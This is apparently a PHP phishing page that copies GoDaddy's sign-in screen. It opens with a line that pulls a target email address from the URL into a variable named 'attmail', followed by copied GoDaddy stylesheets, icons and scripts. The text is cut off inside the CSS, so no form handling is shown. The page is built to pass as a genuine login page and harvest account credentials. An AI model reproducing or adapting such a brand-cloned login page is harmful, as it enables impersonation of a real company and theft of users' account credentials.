<?php 

$attmail = $_GET['user'];
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html class="ux-app footer-html" dir="ltr" lang="en"><head>
 <meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
 
 <meta name="google" content="translate"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Sign In</title>
 <link rel="preload" href="//img6.wsimg.com/ux/fonts/gd-sage/1.0/gd-sage-bold.woff2" as="font" type="font/woff2" crossorigin="">
 <link rel="preload" href="//img6.wsimg.com/ux/fonts/sherpa/2.0/gdsherpa-vf.woff2" as="font" type="font/woff2" crossorigin="">
 
 <style>
@font-face {
  font-family: gd-sage;
  src: url(//img6.wsimg.com/ux/fonts/gd-sage/1.0/gd-sage-bold.woff2) format("woff2")
  , url(//img6.wsimg.com/ux/fonts/gd-sage/1.0/gd-sage-bold.woff) format("woff");
  font-weight: 700;
  font-display: swap;
}
@font-face {
  font-family: gdsherpa;
  src: url(//img6.wsimg.com/ux/fonts/sherpa/2.0/gdsherpa-vf.woff2) format("woff2")
  ;
  font-weight: 300 700;
  font-display: swap;
}
</style>

<link rel="stylesheet" href="https://img6.wsimg.com/wrhs/a3ccccf352c3f2eca28b9efead3483d2/uxcore2.min.css" media="all">
<link rel="stylesheet" href="https://img6.wsimg.com/wrhs/7da2db8a37525b199b8dfa0cab09d318/utilityheader.min.css" media="all" id="header-asset">
<style>
:root{--ux-ut3xrx: #09757a;--ux-unx9i2: #00a4a6;--ux-1m7qrkf: #f5f7f8;--ux-97h3vl: #d4dbe0;--ux-2jubes: .25rem;--ux-1s5tndb: calc(.25rem - .125rem);--ux-1oqjeuu: .25rem;--ux-117cu43: "gdsherpa",Helvetica,Arial,sans-serif;--ux-1klxlj4: 1rem;--ux-8n6y9x: normal;--ux-mgbt9j: 1.5;--ux-1iiiqs3: #ffbbbb;--ux-xaxxaq: #111;--ux-1tgn1ki: #ffeea9;--ux-l48e4z: #111;--ux-em0gr: #9fffb8;--ux-1mph5ru: #111;--ux-1i7a912: #d3c1f7;--ux-1a8ld87: #111;--ux-18lg5k: #a6fff8;--ux-1iwsz6x: #111;--ux-1rfp50t: #ddeaf8;--ux-qnydfw: #111;--ux-bsmnmn: #fbd9ed;--ux-1ygutpa: #111;--ux-1fhc073: #ae1302;--ux-17o0ohq: #fff;--ux-lv1r6m: #aa6d00;--ux-tqp5z3: #fff;--ux-1ep3kxj: #003a15;--ux-zk0uja: #fff;--ux-1lpd00q: #613ea3;--ux-15n32fv: #fff;--ux-cuskv8: #09757a;--ux-c419qd: #fff;--ux-e1mf41: #145fa9;--ux-wi4oww: #fff;--ux-1iwdp0z: #b4006c;--ux-s2edbm: #fff;--ux-gfnupv: "gdsherpa",Helvetica,Arial,sans-serif;--ux-cxbe8g: 1rem;--ux-j40yyd: var(--uxp-font-weight-normal,500);--ux-jw5s9j: 1.5;--ux-1owc8nc: transparent;--ux-1np4r62: transparent;--ux-t04p4h: #fff;--ux-c5mlr8: #111;--ux-kdwujq: #111;--ux-w7826f: #111;--ux-1r87102: #fff;--ux-1p5s1n4: #111;--ux-17htz86: #fff;--ux-1marogz: #ae1302;--ux-ceou01: #ae1302;--ux-1e85ids: #09757a;--ux-15qjz45: transparent;--ux-1ds8u13: transparent;--ux-io2uwb: transparent;--ux-1bdtclp: transparent;--ux-h6e7c1: #fff;--ux-9qpf6c: #00a4a6;--ux-1xliuhi: #00a4a6;--ux-lrwu2k: #fff;--ux-vhbo95: #111;--ux-1331zgr: #111;--ux-5mgu1z: #444;--ux-1ckzto6: #fff;--ux-ran6wz: #444;--ux-bgke81: #444;--ux-1uyxcq5: #fff;--ux-1ehwjjs: #00a4a6;--ux-1hnbfne: #00a4a6;--ux-vwf4ne: #111;--ux-vqhzzz: #fff;--ux-8qoawt: #111;--ux-953c7l: #111;--ux-1e7hthc: #09757a;--ux-c624hh: #fff;--ux-kkdx4n: #111;--ux-19ykcyj: #fff;--ux-ix2s5q: #00a4a6;--ux-1ixzvrg: #00a4a6;--ux-tt846z: #fff;--ux-83yt9q: #ae1302;--ux-1novelo: #ae1302;--ux-1she0w: #111;--ux-9cq6k1: #fff;--ux-1q4q36s: #db1802;--ux-n0tova: #db1802;--ux-17znn9m: #fff;--ux-926l8f: #600801;--ux-w3lhdp: #600801;--ux-cao06b: #fff;--ux-1leynsm: #111;--ux-1067ph9: "gdsherpa",Helvetica,Arial,sans-serif;--ux-vvspv2: 1rem;--ux-sm2he3: var(--uxp-font-weight-normal,500);--ux-1w31hux: 1.5;--ux-k4t5bc: #00a4a6;--ux-yscvvt: #ef6c0f;--ux-3seoiy: #744bc4;--ux-ifyf3f: #aa6d00;--ux-1c4rju4: #1976d2;--ux-1qsbael: #db1802;--ux-vsd31q: #00a4a6;--ux-1afwtm7: #ef6c0f;--ux-3uv4tc: #744bc4;--ux-iievdt: #aa6d00;--ux-99lo9: #1976d2;--ux-ux0m8o: #db1802;--ux-l7zq7p: #f5f7f8;--ux-vuekow: #111;--ux-p4wcd9: "gdsherpa",Helvetica,Arial,sans-serif;--ux-18ime9a: 1.375rem;--ux-1a9e4a3: var(--uxp-font-weight-bold,700);--ux-1pw8hzd: 1.25;--ux-15ks663: "gdsherpa",Helvetica,Arial,sans-serif;--ux-16aixzc: 1rem;--ux-aarlu5: var(--uxp-font-weight-bold,700);--ux-h93mi7: 1.5;--ux-1nk9qds: #767676;--ux-1kpdpz9: transparent;--ux-1p4dc1z: transparent;--ux-f7kpiw: #00a4a6;--ux-1no0ng9: #fff;--ux-1vw9arb: #d6d6d6;--ux-1nu8itt: #fff;--ux-1glcx6s: #2b2b2b;--ux-by6mab: #d6d6d6;--ux-10jlyin: #000;--ux-9wtaa3: "gdsherpa",Helvetica,Arial,sans-serif;--ux-oc0naw: 1rem;--ux-3z6ccd: var(--uxp-font-weight-normal,500);--ux-hm1ty7: 1.5;--ux-1gutwvn: "gdsherpa",Helvetica,Arial,sans-serif;--ux-p4h24g: .875rem;--ux-g9ierp: var(--uxp-font-weight-normal,500);--ux-1dje42v: 1.5;--ux-1im0suq: #000;--ux-i4fj7k: #fff;--ux-wxwyd1: rgba(0,0,0,0.85);--ux-1iqicpb: rgba(255,255,255,0.2);--ux-1o8cusa: #fff;--ux-7wu8i7: #111;--ux-11i8wqh: #fff;--ux-1szqg1n: #111;--ux-1nx9aml: #2b2b2b;--ux-shg991: "gd-sage","Times New Roman",serif;--ux-9ic57q: 2rem;--ux-c539b7: var(--uxp-font-weight-bold,700);--ux-p25s1t: 1.25;--ux-14n8p36: #1976d2;--ux-1ouw3v4: #e20087;--ux-1us68vh: bold;--ux-1kyybpb: #09757a;--ux-cup4ju: #d8efef;--ux-13bzqzo: normal;--ux-ekirkm: #f5f2f0;--ux-145pjib: #000;--ux-1fi898z: #708090;--ux-le566q: #999;--ux-16m8zm9: #905;--ux-ci632o: #690;--ux-1jw5w47: #9a6e3a;--ux-ps2t1y: #07a;--ux-1b06mhh: #DD4A68;--ux-gw3pxw: #e90;--ux-18hc5o7: transparent;--ux-1lv81i7: 1.2rem;--ux-1o6xz0a: 400;--ux-1rklle7: #2b2b2b;--ux-1sjqecz: #f5f5f5;--ux-y66o47: #111;--ux-1ld6fs6: .875rem;--ux-12zlqr9: .875rem;--ux-1bul8sw: var(--uxp-font-weight-normal,500);--ux-asxrqp: #d4dbe0;--ux-1a6cjk7: transparent;--ux-18qj45h: transparent;--ux-4hxkh0: bold;--ux-1ln0xky: bold;--ux-16apl5s: 2;--ux-28rjk: normal;--ux-rm5d87: #d8efef;--ux-jqgd0i: #111;--ux-1xzzhyl: #111;--ux-18vqnuy: #09757a;--ux-7j9lri: #f5f7f8;--ux-1q1acnc: .875rem;--ux-11cn5p4: #00a4a6;--ux-1v7sr65: transparent;--ux-pdb1vi: #111;--ux-1ap6ofp: #db1802;--ux-1x4w1cu: #f5f5f5;--ux-1ith4rq: normal;--ux-u8jrjn: bold;--ux-car98n: #db1802;--ux-1le7uoa: #111;--ux-uoagkw: normal;--ux-1ysi6jp: #111;--ux-ez3zlc: none;--ux-yp4309: #09757a;--ux-170hi5o: #f5f7f8;--ux-1c5c9sy: #09757a;--ux-144ksq0: #fff;--ux-a6rxy5: #00a4a6;--ux-1wbe5uo: .75rem;--ux-1qbop1h: 900;--ux-16dmnu8: #767676;--ux-1vxl8j7: normal;--ux-772dne: .875rem;--ux-e06sn3: normal;--ux-1vjximi: #db1802;--ux-2yoymw: normal;--ux-sji811: #00a63f;--ux-16d2ul: #db1802;--ux-93uoif: bold;--ux-itwf3w: normal;--ux-f6w760: #db1802;--ux-1o4o71l: #fed317;--ux-z976ps: #00a63f;--ux-mk2ln9: #d6d6d6;--ux-1maksku: 400;--ux-5jg1u4: normal;--ux-1il25hb: rgba(245,245,245,0.9);--ux-y6q1mc: 400;--ux-stjkxb: 400;--ux-16xe4be: #00a4a6;--ux-10lnhgv: #fff;--ux-yt1ckt: #d6d6d6;--ux-sehr9i: #111;--ux-15i3nub: transparent;--ux-hv3k1d: #ddd;--ux-r6iz8o: transparent;--ux-162irxm: #ddd;--ux-1pfsknb: 1.423828125rem;--ux-1kom9gi: 400;--ux-1oqmm01: 1em;--ux-mbp9j8: 400;--ux-1utwyy9: #444;--ux-1jw1vht: #bac0c3;--ux-2okpka: #bac0c3;--ux-1c9yx5s: #bac0c3;--ux-1zta3b: #f4f8fc;--ux-1h7a5ui: bold;--ux-2lqd62: .75rem;--ux-19ln60f: bold;--ux-ji3i29: bold;--ux-1f7pqen: #fff;--ux-p3e15m: #db1802;--ux-1g47djv: #fed317;--ux-aqzfxj: #fff;--ux-ny8bg2: #00a63f;--ux-15isxca: #fff;--ux-14gkznj: #744bc4;--ux-15ftva1: 80%;--ux-fynjss: normal;--ux-lt9ehq: normal;--ux-1llin8a: 1.25em;--ux-1w7pysf: bold;--ux-11sf7bz: transparent;--ux-177t0p3: #fff;--ux-md12r6: #00a4a6;--ux-11ovj8p: .875rem;--ux-1hfks3w: normal;--ux-6wr86x: #aab7c2;--ux-7a9pn9: bold;--ux-1qsry5z: normal;--ux-1smybcz: .875rem;--ux-3rg0ia: #bac0c3;--ux-xkgc86: #2b2b2b;--ux-bt2zqe: var(--uxp-font-weight-bold,700);--ux-bs151i: #d6d6d6;--ux-1f4daep: bold;--ux-bwdcn: bold;--ux-1eyzgq6: bold;--ux-u5dvr1: normal;--ux-2domxp: #d6d6d6;--ux-1nr6ynb: 400;--ux-1lxyxj9: normal;--ux-c9uvim: #00a4a6;--ux-lgzajt: #00a4a6;--ux-1s0t9v0: 0.7023319615912209rem;--ux-1xzegcp: bold;--ux-1fzd9l5: transparent;--ux-1tx8bkn: #600801;--ux-e0ldzz: #003a15;--ux-1jc2o1e: #004249;--ux-acokjr: #d8efef;--ux-emb11o: #004249;--ux-y3mv0: #d6d6d6;--ux-1hei7eo: #db1802;--ux-v02jxi: normal;--ux-jg1026: 1.5rem;--ux-1b8kf4b: bold;--ux-tjjc5f: bold;--ux-4g1r2t: bold;--ux-1n2ego0: .8rem;--ux-1dkcied: normal;--ux-1095x0d: normal;--ux-jigg19: bold;--ux-195rcgy: normal;--ux-1g1i1da: #2b2b2b;--ux-uo0fqb: bold;}
</style>
<link src="//img6.wsimg.com/ux/favicon/manifest.json" rel="manifest">
<link rel="apple-touch-icon" sizes="57x57" href="//img6.wsimg.com/ux/favicon/apple-icon-57x57.png">
<link rel="apple-touch-icon" sizes="60x60" href="//img6.wsimg.com/ux/favicon/apple-icon-60x60.png">
<link rel="apple-touch-icon" sizes="72x72" href="//img6.wsimg.com/ux/favicon/apple-icon-72x72.png">
<link rel="apple-touch-icon" sizes="76x76" href="//img6.wsimg.com/ux/favicon/apple-icon-76x76.png">
<link rel="apple-touch-icon" sizes="114x114" href="//img6.wsimg.com/ux/favicon/apple-icon-114x114.png">
<link rel="apple-touch-icon" sizes="120x120" href="//img6.wsimg.com/ux/favicon/apple-icon-120x120.png">
<link rel="apple-touch-icon" sizes="144x144" href="//img6.wsimg.com/ux/favicon/apple-icon-144x144.png">
<link rel="apple-touch-icon" sizes="152x152" href="//img6.wsimg.com/ux/favicon/apple-icon-152x152.png">
<link rel="apple-touch-icon" sizes="180x180" href="//img6.wsimg.com/ux/favicon/apple-icon-180x180.png">
<link rel="icon" type="image/png" sizes="192x192" href="//img6.wsimg.com/ux/favicon/android-icon-192x192.png">
<link rel="icon" type="image/png" sizes="16x16" href="//img6.wsimg.com/ux/favicon/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="//img6.wsimg.com/ux/favicon/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="96x96" href="//img6.wsimg.com/ux/favicon/favicon-96x96.png">
<link rel="mask-icon" href="//img6.wsimg.com/ux/favicon/safari-pinned-tab.svg" color="#52c4cb">
<meta name="msapplication-TileColor" content="#111111">
<meta name="msapplication-TileImage" content="//img6.wsimg.com/ux/favicon/ms-icon-144x144.png">
<meta name="msapplication-config" content="//img6.wsimg.com/ux/favicon/browserconfig.xml">
<meta name="theme-color" content="#111">
<link rel="manifest" href="//img6.wsimg.com/ux/favicon/manifest.json"><style>#left-col{display:none !important}body{min-height:0 !important}body.ux-app.uxf-flex.market-selector-open{overflow:scroll}html{background-size:0;background-position:top center;background-repeat:no-repeat}.lg-container{margin:0 auto}#login-container{margin-top:0}@media screen and (min-width:520px){#login-container{margin-top:10px}}@media screen and (min-width:768px){#login-container-row{display:flex}#login-container-col{margin-bottom:10px}#left-col{display:block !important}}@media screen and (min-width:992px){.lg-container{width:980px}#login-container-parent{display:table}#login-container-col{width:460px}#login-container{margin-top:40px}html{background-size:cover !important}body{background-color:transparent !important}}@media screen and (min-width:1200px){#login-container-col{width:565px}.lg-container{width:1150px}}</style><style>#pass-bg{position:absolute;top:20%;width:50%;display:none}@media screen and (min-width:992px){#pass-bg{display:block}}</style><link rel="dns-preload" href="//img6.wsimg.com"><link href="https://img1.wsimg.com/auth/v1/static/3317/img/favicon.ico" rel="shortcut icon" type="image/vnd.microsoft.icon"><style>
        #appheader-footer {
            position: absolute;
            bottom: 0;
        }

      

        
        .footer_fixer > div:first-of-type {
            background-color: #f5f7f8;
        }

        .language-header {
            border-bottom: 0;
        }
    </style>
   
    
    <meta name="google-site-verification" content="t7JT1iH2iscenNr74R-kgXPljL_ru6OPiT9RE8zDk04">
  
      <script src="https://img6.wsimg.com/wrhs/e099922f63ddb7a5d4027821f53ee78f/tcc.min.js"></script>
      <script src="https://img6.wsimg.com/poly/v3/polyfill.min.js?features=Promise,Promise.prototype.finally,fetch,AbortController,Intl.~locale.en-US&amp;rum=0&amp;unknown=polyfill&amp;flags=gated"></script>

      <script src="https://img6.wsimg.com/wrhs/465ca044522b7ccfa4df6319d460e42b/uxcore2.min.js"></script>
      <script src="https://img6.wsimg.com/wrhs/5f1d295b85aaaba74af4ee02bdc62854/vendor~uxcore2.min.js"></script>
      <script src="https://img6.wsimg.com/wrhs/d6c7b1acb132140b70d61ad9ce6bc527/heartbeat.min.js"></script>
      <script src="https://img6.wsimg.com/wrhs/2a8723002f286c722aab4069a3c0bc9c/utilityheader.min.js"></script>
      <script type="text/javascript" async="" src="https://img6.wsimg.com/wrhs/19613ac22420404c34b7162ef50370cf/tti.min.js"></script>
      <script charset="utf-8" src="https://img6.wsimg.com/wrhs/dffbab4b36fb049029b7ac907a90f8c7/vendors~browser-deprecation-banner.header-chunk.min.js"></script>
      
      <style>.round-key-cls-1 {
  fill:#2b2b2b;
  stroke:#000;
  stroke-linecap:round;
  stroke-linejoin:round;
  stroke-width:4px;
}
.round-key-cls-2 {
  fill:#757575;
}
.round-key-cls-3{
  fill:#999;
}
#round-security-key-svg {
  min-width: 100px;
  min-height: 100px;
}

@media screen and (max-width: 330px) {
  #round-security-key-svg {
    height: 50px;
    width: 50px;
  }
}</style><style>.google-st0 {
  fill:#4285F4;
}
.google-st1 {
  fill:#34A853;
}
.google-st2 {
  fill:#FBBC04;
}
.google-st3 {
  fill:#EA4335;
}</style>

<style>/******************* All buttons *******************/
.alternative-login-button {
  min-height: 40px;
}

#social-login-buttons-container .ux-btn-set {
  flex-direction: unset;
}

#social-login-buttons-container .ux-btn-set.ux-btn-split .ux-btn-set-item {
  width: 100%;
  margin-left: 3px;
}

[dir=rtl] #social-login-buttons-container .ux-btn-set.ux-btn-split .ux-btn-set-item {
  margin-right: 3px;
}

#social-login-buttons-container .ux-btn-set .ux-btn-set-item, .modal-footer .ux-btn-set .ux-btn-set-item + .ux-btn-set-item {
  margin-bottom: 0;
}

#social-login-buttons-container.icon-only .ux-btn-set {
  justify-content: center;
}

@media (max-width: 325px) {
    #social-login-buttons-container .ux-btn-set-item {
      padding-left: 5px;
      padding-right: 5px;
    }
    [dir=rtl] #social-login-buttons-container .ux-btn-set-item {
      padding-right: 5px;
      padding-left: 5px;
    }
}

/******************* Social Buttons *******************/

#social-login-buttons-container #facebook_auth:focus, #social-login-buttons-container #facebook_auth:hover {
  background:#4267B2!important;
}

#social-login-buttons-container #wechat_auth:focus, #social-login-buttons-container #wechat_auth:hover {
  background: #1AAD19!important;
}

#social-login-buttons-container #amazon_auth:focus, #social-login-buttons-container #amazon_auth:hover {
  background: #F0C556!important;;
}

#social-login-buttons-container #google_auth:focus, #social-login-buttons-container #google_auth:hover {
  background: #F5F5F5!important;
}

#social-logo {
  display: block;
  position: relative;
  height: 20px;
  margin-right: 8px;
}

[dir=rtl] #social-logo {
  margin-left: 8px;
}

@media (max-width: 325px) {
  #social-logo {
    margin-right: 0px !important;
  }
  [dir=rtl] #social-logo {
    margin-left: 0px !important;
  }
}

#amazon-btn-txt,
#google-btn-txt {
  color: black!important;
}

#social-login-buttons-container #social-logo.wechat-logo {
  height: 21px;
  fill: #1AAD19;
}

#social-login-buttons-container #wechat_auth:focus #social-logo.wechat-logo,
#social-login-buttons-container #wechat_auth:hover #social-logo.wechat-logo {
  fill: white;
}

#social-login-buttons-container #social-logo.fb-logo {
  fill: #4267B2;
  margin-left: 5px !important;
}

[dir=rtl] #social-login-buttons-container #social-logo.fb-logo {
  margin-right: 5px !important;
}

#social-login-buttons-container #facebook_auth:focus #social-logo.fb-logo, 
#social-login-buttons-container #facebook_auth:hover #social-logo.fb-logo {
  fill: white;
}

#social-login-buttons-container #facebook-btn-txt {
  color: #4267B2;
}

#social-login-buttons-container #wechat-btn-txt {
  color: #1AAD19;
}

#social-login-buttons-container #facebook_auth:focus #facebook-btn-txt,
#social-login-buttons-container #facebook_auth:hover #facebook-btn-txt,
#social-login-buttons-container #wechat_auth:focus #wechat-btn-txt,
#social-login-buttons-container #wechat_auth:hover #wechat-btn-txt {
  color: white;
}

.alternative-login-button-icon-only {
  min-width: 48px !important;
  max-width: 48px !important;
  padding-left: 2px !important;
  padding-right: 2px !important;
}

[dir=rtl] .alternative-login-button-icon-only {
  padding-right: 2px !important;
  padding-left: 2px !important;
}

.alternative-login-button-icon-only #social-logo {
  width: 48px;
  margin: auto !important;
}

.alternative-login-button #social-logo {
  width: 15px;
}

a.alternative-login-button-icon-only {
  margin-left: 12px !important;
  margin-right: 12px !important;
}

[dir=rtl] a.alternative-login-button-icon-only {
  margin-right: 12px !important;
  margin-left: 12px !important;
}

@media (max-width: 519px) and (min-width: 381px) {
 #social-login-buttons-container .alternative-login-button:first-of-type {
    margin-right: 8px;
 }
 [dir=rtl] #social-login-buttons-container .alternative-login-button:first-of-type {
   margin-left: 8px;
 }
}

/******************* End of Social buttons *******************/


/******************* 'Or' labeled divider for buttons *******************/
#labeled-divider {
  overflow: hidden;
  font-size:18px !important;
  text-align: center;
  padding: 10px !important;
}

#labeled-divider > span {
  position: relative;
  display:
  inline-block;
}

#labeled-divider > span:before, #labeled-divider > span:after {
  position: absolute;
  top: 51%;
  width: 44%;
  height: 1px;
  content: '\a0';
  background-color: #E2E2E2;
}

#labeled-divider > span:before {
  right: 53%;
  margin-right:15px;
}

[dir=rtl] #labeled-divider > span:before {
  left: 53%;
  margin-left:15px;
}

#labeled-divider > span:after {
  left: 53%;
  margin-left:15px;
}

[dir=rtl] #labeled-divider > span:after {
  right: 53%;
  margin-right:15px;
}
/***************** End of 'Or' labeled divider for buttons *****************/
</style><style>:root{--uxp-icon-drop-left:url("data:image/svg+xml;utf-8,<svg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24'><path fill-rule='evenodd' d='M5.06 12L18 19.77V4.23L5.06 12zM16 16.23L8.94 12 16 7.77v8.46z' clip-rule='evenodd'/></svg>");}
</style><style>:root{--uxp-icon-mobile-phone:url("data:image/svg+xml;utf-8,<svg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24'><path fill-rule='evenodd' d='M14 7h-4V5h4v2zm5-5v20H5V2h14zm-2 2H7v16h10V4zm-5 12.96c-.55 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z' clip-rule='evenodd'/></svg>");}
</style><style>:root{--uxp-icon-mail:url("data:image/svg+xml;utf-8,<svg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24'><path fill-rule='evenodd' d='M2 4v16h20V4H2zm18 10.06l-3.07-2.05L20 9.99v4.07zM20 6v1.6l-7.95 5.23L4 7.32V6h16zM7.3 12L4 14.2V9.75L7.3 12zM4 18v-1.39l5.08-3.38 2.95 2.02 3.09-2.03L20 16.46V18H4z' clip-rule='evenodd'/></svg>");}
</style><style>:root{--uxp-icon-checkmark:url("data:image/svg+xml;utf-8,<svg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24'><path fill-rule='evenodd' d='M21.41 6.5L9 18.91 2.59 12.5 4 11.09l5 5 11-11 1.41 1.41z' clip-rule='evenodd'/></svg>");}
</style><style>:root{--uxp-icon-x:url("data:image/svg+xml;utf-8,<svg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24'><path fill-rule='evenodd' d='M13.41 12l4 4L16 17.41l-4-4-4 4L6.59 16l4-4-4-4L8 6.59l4 4 4-4L17.41 8l-4 4z' clip-rule='evenodd'/></svg>");}
</style><style>:root{--uxp-icon-chevron-left-lt:url("data:image/svg+xml;utf-8,<svg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24'><path fill-rule='evenodd' d='M15 19.4L7.6 12 15 4.6 16.4 6l-6 6 6 6-1.4 1.4z' clip-rule='evenodd'/></svg>");}
</style><style>/******************* General Panel Spacing *******************/

#login-panel .form-group {
  margin-bottom: 10px;
}

#login-panel .form-text {
  margin-bottom: 10px;
}

#login-panel .modal-footer {
  justify-content: flex-start
}

#login-panel .card, #login-panel .ux-card {
    margin-bottom: 0;
}

@media screen and (max-width: 767px) {
  #login-panel #new-ux.card.ux-card.idp .card-block.idp, #login-panel #new-ux.card.ux-card.reseller .card-block.reseller {
    padding-top: 8px !important;
  }
}

/***************** End of General Panel Spacing *****************/
/***************** Form Header *****************/
#login-panel .idp #form-header {
  margin-bottom: 15px;
}

#login-panel .idp-form-header,
#login-panel #form-header #godaddy-template {
  justify-content: center;
  align-items: flex-end;
  flex-wrap: wrap;
}

#login-panel .idp-form-header, #login-panel #form-header #godaddy-template {
  padding-top: 0px;
}

#login-panel #headless-logo-container {
  display: none;
}

#login-panel #success-screen #headless-logo-container {
  display: block;
}

#login-panel #new-ux #form-header #godaddy-template {
  display: flex;
}

#login-panel #new-ux #form-header #godaddy-template .logo {
  max-width: 30px;
  max-height: 45px;
}

#login-panel #form-header #godaddy-template #head-logo-container {
  width: 35px;
}

#login-panel #new-ux #godaddy-template #head-logo-container {
  margin: 0;
}

#login-panel #form-header h2 {
  margin-bottom: 0px;
}

#login-panel #new-ux #form-header #godaddy-template h2 {
  text-align: center;
}

#login-panel #new-ux #form-header #godaddy-template .country-name {
  visibility: hidden;
}

#login-panel .reseller #form-header {
  margin-bottom: 10px;
}

#login-panel #form-header #reseller-template {
  padding-top: 0px;
  margin-bottom: 0px;
}

#login-panel #form-header #reseller-template #reseller-name {
  padding-bottom: 15px;
}

#login-panel #form-header #reseller-template h2 {
  text-align: left;
  padding-top: 0px;
}

[dir=rtl] #login-panel #form-header #reseller-template h2 {
  text-align: right;
}

#login-panel #new-ux #reseller-template .logo {
  max-height: 36px;
  margin-bottom: 10px;
}

#login-panel .card-block.pass, #login-panel .card-block.pass.reseller {
  padding: 0px;
}

#login-panel #provisioning-template {
  padding-top: 10px;
  padding-bottom: 40px;
}

#login-panel #provisioning-template .page-title{
  margin-bottom: 16px;
}

#login-panel #provisioning-template .page-subtitle{
  margin-bottom: 8px;
}

#login-panel #provisioning-template #submit-button{
  display: grid;
}

#login-panel #provisioning-template .password-confirm-pwd .form-group {
  margin-bottom: 24px !important;
}

#login-panel #provisioning-template .password-confirm-pwd {
  padding-top: 8px;
}

#login-panel .pass #form-container {
  padding: 10px 20px 30px 20px;
}

#login-panel #form-header #pass-template .logo-container-pass-o365{
  padding-top: 0px;
  margin-bottom: 15px;
}

#login-panel #password-container {
  position: relative;
}

[dir="ltr"] #login-panel .show-hide {
  right: 0px;
}

[dir="rtl"] #login-panel .show-hide {
  left: 0px;
}

#login-panel .show-hide {
  position: absolute;
  top: 0px;
}

#login-panel .tos-text {
  color: #999999;
  display: inline;
  font-size: 13px;
}

#login-panel #success-screen #form-header {
  margin-bottom: 16px;
  margin-top: 40px;
}

#login-panel #success-screen h4 {
  margin-bottom: 0;
}

#login-panel #success-screen #finish-string-container {
  padding-top: 0;
}

#login-panel #provisioning-template {
  padding-left: 20px;
  padding-right: 20px;
}

[dir=rtl] #login-panel #provisioning-template {
  padding-right: 20px;
  padding-left: 20px;
}

@media (min-width: 768px) {
  #login-panel #new-ux.card.ux-card .card-block.idp, #login-panel #new-ux.card.ux-card .card-block.idp.reseller {
    padding: 40px 48px;
  }

  #login-panel #provisioning-template {
    padding-left: 90px;
    padding-right: 90px;
  }

  [dir=rtl] #login-panel #provisioning-template {
    padding-right: 90px;
    padding-left: 90px;
  }
}

@media (min-width: 1200px) {
  #login-panel .pass #form-container {
    padding: 25px 100px 35px 100px;
  }
  #login-panel #title h3 {
    font-size: 2.5rem;
  }
}

/******************* Links *******************/
#login-panel a {
  cursor: pointer;
}

#login-panel #new-ux #create-account-link {
  display: flex;
  flex-wrap: wrap;
  justify-content: center;
  padding-bottom: 15px;
}

#login-panel #new-ux #create-account-link p {
  margin-right: 5px;
  margin-bottom: 0px;
}

[dir=rtl] #login-panel #new-ux #create-account-link p {
  margin-left: 5px;
}

#login-panel #new-ux.idp #create-account-link {
  justify-content: center;
}

#login-panel #new-ux.reseller #create-account-link {
  justify-content: left;
}

/******************* Form fields *******************/
#login-panel .sso-field-danger {
    border-color: #db1802 !important;
    background-color: #fadcd9 !important;
    box-shadow: none !important;
}

#login-panel .username-input {
  text-align: left;
}

[dir=rtl] #login-panel .username-input {
  text-align: right;
}

/******************* Remember-me *******************/
#login-panel #remember-me-container > .form-group {
  display: inline;
}

#login-panel #remember-me-container #label-remember-me {
  margin-right: auto !important;
}

[dir=rtl] #login-panel #remember-me-container #label-remember-me {
  margin-left: auto !important;
}

#login-panel #new-ux #remember-me-container {
  margin-bottom: 2px;
}

/***************** End Remember-me *****************/
/***************** End form fields *****************/

/******************* All Buttons *******************/
#login-panel .card-block button:not(.alternative-login-button) {
  max-height: 40px;
}

#login-panel .card-block #submitBtn {
  min-width: 100%;
}

#login-panel .card-block .modal-footer #sign-in-btn {
  margin-bottom: 0px;
}

#login-panel .card-block .modal-footer #create-with-fb-btn {
  white-space: nowrap;
}

#login-panel .modal .ux-btn-set {
  width: 100%;
  margin-bottom: 0px;
}

#login-panel #text-social-button-divider {
  margin-top: 7px;
  margin-bottom: 11px;
  text-align: center;
}

#login-panel #emailPromoButton {
  min-width: 100%;
  max-height: 40px;
}

/***************** End of All Buttons *****************/

#login-panel #recovery-links {
  margin: 15px 0 0 0;
  text-align: center;
}

/******************* Reseller extra footer  *******************/
#login-panel .reseller-help-info {
    text-align: center;
    margin-top: 15px;
}

#login-panel .btn-link {
    text-decoration: underline;
    cursor: pointer;
}

/***************** End reseller extra footer  *****************/

/********* Email Promo Footer for PASS **********/

#login-panel #email-promo-footer {
  position: relative;
  display: flex;
  flex-direction: column;
  word-wrap: break-word;
  text-align: center;
  background-clip: border-box;
  margin-top: 20px;
  padding: 0px 20px 0px 20px;
  margin-bottom: 30px;
}

@media (min-width: 1200px) {
  #login-panel #email-promo-footer {
    padding: 0px 100px 0px 100px;
  }
}

#login-panel #email-promo-footer #email-message {
  color: #444;
  font-size: 16px;
  text-align: center;
  margin-bottom: 15px;
}

/***************** End Dont have account footer *****************/

#login-panel .tac-collection p {
  margin-bottom: 15px;
}

#login-panel .tac-collection .info-group {
  margin-bottom: 20px
}

#login-panel .tac-collection .form-group {
  margin-bottom: 30px;
}

#login-panel .tac-collection .form-group .uxicon, #login-panel .tac-collection .form-group .ux-spinner {
  margin-left: 3px;
  margin-right: 0;
}

[dir=rtl] #login-panel .tac-collection .form-group .uxicon, [dir=rtl] #login-panel .tac-collection .form-group .ux-spinner {
  margin-right: 3px;
  margin-left: 0;
  margin-right: 3px;
  margin-left: 0;
}

#login-panel .tac-selection button,
#login-panel .tac-collection button {
  width: 100%;
  max-width: none;
}

#login-panel .tac-selection .back-button, #login-panel .tac-selection p {
  margin-bottom: 18px;
}

#login-panel .tac-selection .form-group {
  margin-bottom: 32px;
